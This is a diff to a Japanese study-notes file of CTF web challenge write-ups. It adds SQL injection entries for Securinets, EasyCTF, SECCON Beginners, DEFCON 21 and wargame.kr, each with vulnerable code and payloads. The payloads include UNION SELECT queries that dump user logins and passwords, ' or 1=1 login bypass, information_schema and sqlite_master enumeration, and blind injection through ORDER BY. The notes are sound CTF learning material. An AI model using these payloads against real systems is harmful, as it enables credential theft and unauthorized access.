@@ -424,7 +424,7 @@ for文で`user[key]=tmp[key]`のように値を代入して行く場合、`user.
 - **Prototype Pollutionの参考**  
 https://qiita.com/koki-sato/items/7b78f9ec139230b95beb  
 https://jovi0608.hatenablog.com/entry/2018/10/19/083725  
-## bypass filtering space 'or' '|' ',' (SECCON CTF 2019 予選 web_search)
+## bypass filtering space 'or' '|' ',' / 検索フォーム　(SECCON CTF 2019 予選 web_search)
 https://kinako-mochimochi.hatenablog.com/entry/2019/10/20/203747  
 https://st98.github.io/diary/posts/2019-10-20-seccon-online-ctf.html  
 - **entrypoint**  
@@ -673,7 +673,7 @@ while True:
     print("[+] target: " + target)
 print("[+] target: " + target)
 ```
-## filter union / blind injection (Pragyan CTF Animal attack)
+## filter union / blind injection / 検索フォーム (Pragyan CTF Animal attack)
 http://ctf.publog.jp/archives/1069963262.html  
 http://kyuri.hatenablog.jp/entry/2018/03/06/182735  
 - **entrypoint**  
@@ -769,24 +769,103 @@ leak_table_column_name()
 leak_admins_password()
 # pctf{L31's|@Ll_h4il-1h3-c4T_Qu33n.?}
 ```
-## (Securinets Prequals CTF 2019 – SQL Injected)
+## Union query / login (Securinets Prequals CTF 2019 – SQL Injected)
 https://ctftime.org/writeup/14117  
 - **entrypoint**  
-
+配布されるソースの中の以下が脆弱。  
+PayloadをusernameとしてRegisterすればSQLInjectionできそう。  
+```txt
+$sql = "SELECT * FROM posts WHERE author = '". $_SESSION['username'] ."'";
+```
+`https://web5.ctfsecurinets.com/flags.php`にadminとしてログインすればフラグが得られる。  
+`create_db.sql`では以下のようになっているため、データベース上の構成がわかる。  
+`users`テーブルには`id`,`login`,`password`,`role`  
+`posts`テーブルには`id`,`title`,`content`,`date`,`author`カラムで構成されている。  
+```txt
+create database webn;
+create table users (id int auto_increment primary key, login varchar(100), password varchar(100), role boolean default 0);
+create table posts (id int auto_increment primary key, title varchar(50), content text, date Date, author varchar(100));
+```
+上記のSQLInjectionできるポイントで`title`,`content`カラムを表示させるところに`union select login,password from users`みたいな感じでユーザー名とパスワードを合わせれば表示されそう。  
+`union select`では`posts`テーブルと同じカラム数を渡さないといけないので以下のようにNULLで調整。  
+admin的なユーザーの名前もパスワードのカラム名もわからないが、roleが1となっているはずなので以下のようにする。  
+```txt
+' UNION SELECT id, login, password, NULL, NULL FROM users WHERE role = 1 AND '' = '
+```
+これで得られたクレデンシャルでログインすればFlagが得られる。  
 - **payload**  
+```txt
+' UNION SELECT id, login, password, NULL, NULL FROM users WHERE role = 1 AND '' = '
+```
+## Union query / DB empty / login  (EasyCTF 2017  Sql Injection 2)
+https://ctftime.org/writeup/6016  
+- **entrypoint**  
+`power level over 9000`で`leet1337`というユーザーでログインする必要があるが、そのようなユーザーはDBには存在しないと問題文にある。Union selctで挿入すればよい。  
+以下のような構成になっているらしい。  
+```txt
+select username, password, power_level, id from some-table where username="" and password="(our sql string)"
+```
+`" union select sleep(5),"leet1337","leet1337",9001`を挿入すると最後の`9001`が文字列ではないため、`9001"`となってしまいよろしくない。そのため、以下のように適当なテーブルからデータを取得してるっぽく描けばいい。(コメントしてもいいと思うけど)  
+```txt
+" union select sleep(5),"leet1337","leet1337",9001 from INFORMATION_SCHEMA.COLUMNS where COLUMN_NAME="password
+```
+- **payload**  
+```txt
+" union select sleep(5),"leet1337","leet1337",9001 from INFORMATION_SCHEMA.COLUMNS where COLUMN_NAME="password
+```
+## Union query / 検索フォーム (SECCON Beginners CTF 2019 Ramen)
+https://nomizooon.hateblo.jp/entry/2019/05/27/190418  
+- **entrypoint**  
+検索フォームにSQLInjectionできる。  
+`' or 1=1 -- -`でエラーにならないのでSQLInjection可能とわかる。  
+以下のようにしてカラム数を特定すると３でエラーとなったので2とわかる。  
+```txt
+' order by 1 #
 
-## 
+' order by 2 #
+
+' order by 3 #  // エラー
+```
+以下でFlagテーブルのFlagカラムにあるとわかる。  
+```txt
+' UNION SELECT table_name,column_name from information_schema.columns #
+```
+以下でFlagゲット！  
+```txt
+' UNION SELECT flag,0 FROM flag #
+```
+- **payload**  
+```txt
+' UNION SELECT flag,0 FROM flag #
+```
+
+## Union query / login (DEFCON 21 CTF babysfirst)
+https://emeth.jp/diary/2013/06/defcon-21-ctf-qualification-writeup/  
+- **entrypoint**  
+loin formがあり適当にログインすると以下のようなレスポンスヘッダが返るため、SQLInjection可能とわかる。  
+```txt
+X-Sql: select username from users where username='xxx' and password='yyy' limit 1;
+```
+`' or 1=1;--`を入れると`root`としてログインできるが、Flagは出ない。  
+`' union select password from users where username='root';--`でrootのパスワードは見えるがFlagではない。  
+SQLite3を使っているため、以下でいろいろ調べるとkeysというテーブルがあり、そこにFlagがあったらしい。  
+```txt
+' union select sql from sql_master where type='table' and name='users';--
+```
+```txt
+' union select value from keys;--
+```
+- **payload**  
+```txt
+' union select value from keys;--
+```
+
+#
 - **entrypoint**  
 - **payload**  
-
-## 
+#
 - **entrypoint**  
 - **payload**  
-
-## 
-- **entrypoint**  
-- **payload**  
-
 
 # 常設の練習
 ## picoCTF 2019
@@ -878,6 +957,90 @@ Internal Server error
 ' || (SELECT group_concat(sql) FROM sqlite_master) || '
 CREATE TABLE user ( id INTEGER NOT NULL, username VARCHAR(64), name VARCHAR(128), password_hash VARCHAR(128), secret VARCHAR(128), admin INTEGER, PRIMARY KEY (id) ),CREATE UNIQUE INDEX ix_user_username ON user (username),CREATE TABLE todo ( id INTEGER NOT NULL, item VARCHAR(256), user_id INTEGER, PRIMARY KEY (id), FOREIGN KEY(user_id) REFERENCES user (id) ) 
 ```
+## wargame.kr
+### inject into order by / blind Injection (dbms335)
+https://taiyakon.com/2017/09/ctfwargamekr-19-dbms335writeup.html  
+- **entrypoint**  
+```php
+<?php
+if (isset($_GET['view-source'])) {
+    show_source(__FILE__);
+    exit();
+}
+include("./inc.php");
+include("../lib.php");
+//usleep(200000*rand(2,3));
+if(isset($_POST['sort'])){
+ $sort=$_POST['sort'];
+}else{
+ $sort="asc";
+}
+?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> 
+<html>
+ <head>
+  <style type="text/css">
+   body {background-color:#eaeafe;}
+   #title {text-align:center; font-size:22pt; border:1px solid #cacaca;}
+   #reg:hover {color:#557; cursor:pointer;}
+   #contents {text-align:center; width:550px; margin: 30px auto;}
+   #admin_tbl {width:100%;}
+   #admin_tbl thead tr td {border-bottom:1px solid #888; font-weight:bold;}
+   #admin_tbl tbody tr td {border-bottom:1px solid #aaa;}
+   #admin_tbl #reg {width:200px;}
+  </style>
+  <script type="text/javascript" src="./jquery.min.js"></script>
+  <script type="text/javascript" src="./jquery.color-RGBa-patch.js"></script>
+  <script type="text/javascript"> var sort="<?php echo $sort; ?>"; </script>
+  <script type="text/javascript" src="./main.js"></script>
+ </head>
+ <body>
+  <div id="title"> Lonely guys Management page </div>
+  <div id="contents">
+   <table id="admin_tbl">
+    <thead>
+     <tr><td>the list of guys that need a girlfriend.</td><td id="reg">reg_single <sub>(sort)</sub></td></tr>
+    </thead>
+    <tbody>
+     <?php
+      mysql_query("update authkey set authkey='".auth_code('lonely guys')."'");
+      $sort = mysql_real_escape_string($sort);
+      $result=mysql_query("select * from guys_tbl order by reg_date $sort");
+      while($row=mysql_fetch_array($result)){
+       echo "<tr><td>$row[1]</td><td>$row[2]</td></tr>";
+      }
+     ?>
+    </tbody>
+   </table>
+  </div>
+  <div style="text-align:center;">
+      <a href="?view-source">view-source</a>
+  </div>
+ </body>
+</html>
+```
+以下が怪しい。`mysql_real_escape_string`はPHP7以降は削除された関数で`\x00`,`\`,`'`,`"`,`\n`,`\r`,`\x1a`をエスケープしてくれるが、それだけなので`or 1=1`みたいにすると普通にInjectionできる！  
+今回も`'$sort'`とされていないのでSQLInjection可能とわかる。  
+```php
+      mysql_query("update authkey set authkey='".auth_code('lonely guys')."'");
+      $sort = mysql_real_escape_string($sort);
+      $result=mysql_query("select * from guys_tbl order by reg_date $sort");
+```
+`order by`句の中にInjectできる場合は以下のようにして、order byが複数行副問い合わせを受け付けないことを利用した有名なBlindができるらしい。  
+https://notsosecure.com/injection-in-order-by-clause/  
+```txt
+mysql> select id from news where id =1 order by 1, (select case when (1=1) then 1 else 1*(select table_name from information_schema.tables)end)=1;
++——+
+| id   |
++——+
+|    1 | 
++——+
+1 row in set (0.00 sec)
+—-
+mysql> select id from news where id =1 order by 1, (select case when (1=2) then 1 else 1*(select table_name from information_schema.tables)end)=1;
+ERROR 1242 (21000): Subquery returns more than 1 row
+—–
+```
+- **payload**  
 
 ## hacker101 CTF
 ### Photo Gallery
